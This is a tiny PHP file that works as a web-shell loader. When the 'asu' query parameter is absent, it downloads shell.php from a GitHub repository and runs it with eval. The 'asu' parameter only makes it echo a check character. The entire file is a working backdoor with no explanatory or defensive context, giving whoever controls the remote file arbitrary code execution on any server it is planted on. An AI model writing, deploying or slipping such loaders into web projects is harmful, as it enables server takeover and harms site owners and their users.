<?php 
     if(isset($_GET["asu"])) {
          echo "a";
     } else {
          eval("?>".file_get_contents("https://raw.githubusercontent.com/NoobSecID/webshell/master/shell.php"));
     }
?>
